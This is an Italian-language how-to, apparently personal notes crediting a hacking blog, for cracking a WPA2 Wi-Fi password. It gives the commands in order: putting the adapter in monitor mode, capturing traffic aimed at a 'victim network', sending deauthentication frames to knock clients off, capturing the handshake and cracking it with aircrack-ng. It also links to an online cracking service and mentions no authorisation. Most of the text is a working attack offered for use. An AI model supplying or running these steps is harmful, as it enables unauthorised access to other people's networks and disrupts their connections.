CREDITI ATTACCO:https://www.hackerwebsecurity.com/craccare-password-wifi-con-chiave-wpa2-parte-4-di-6/
> QUESTO ATTACCO NON PUò ESSERE EFFETTUATO SU MACCHINA VIRTUALE SE NON IN POSSESSO DI UNA Antenna Wireless
> PER EFFETTUARE L'ATTACCO è STATA UTILIZZATO KALI LINUX LIVE SU UNA CHIAVETTA USB DA 32GB
>>ATTENZIONE: mettendo la sola interfaccia Wi-Fi in modalità monitor perderai probabilmente la connessione a Internet se non hai Ethernet, tethering o un adattatore USB aggiuntivo.
Una radio può essere in managed o in monitor (non entrambe su canali diversi); riavvia NetworkManager per ripristinare la connettività.

Aprire un terminale e mettere in monitor mode:
```bash
ipconfig
```
```bash
sudo airmon-ng start wlan0
```
Aprire wireshark e sniffare il traffico nell'aria
```bash
sudo wireshark &
```
Poi aprire un terminale e digitare:
```bash
airodump-ng wlan0
```
Individuate la rete di vostro interesse e sorvegliatela con il comando:
```bash
sudo airodump-ng -c 2 --bssid <INDIRIZZO MAC RETE VITTIMA> -w DUMP wlan0
```
Ora aprire un secondo terminale e digitare il comando di deauth con aireplay-ng (tante volte perchè deve provare tutti i canali finquandp non lo butti giù):
```bash
sudo aireplay-ng -0 10 -a <INDIRIZZO MAC RETE VITTIMA> -c <INDIRIZZO MAC Client> wlan0 
```
Recatevi su Wireshark, digitate EAPOL
Quei 4 pacchetti che vedete sono l'HandShake. Ma adesso bisogna decriptarlo, utilizzeremo Aircrack. Digitate il comando:
```bash
sudo aircrack-ng -b <INDIRIZZO MAC RETE VITTIMA> DUMP.cap
```
Tal volta le cifrature sono molto "toste" per cui, il PC medio, potrebbe non farcela in tempi ragionevoli, a tal proposito vi suggerisco un servizio online che potrà decriptarla per voi in poche ore:
LINK: https://www.onlinehashcrack.com/wifi-wpa-rsna-psk-crack.php

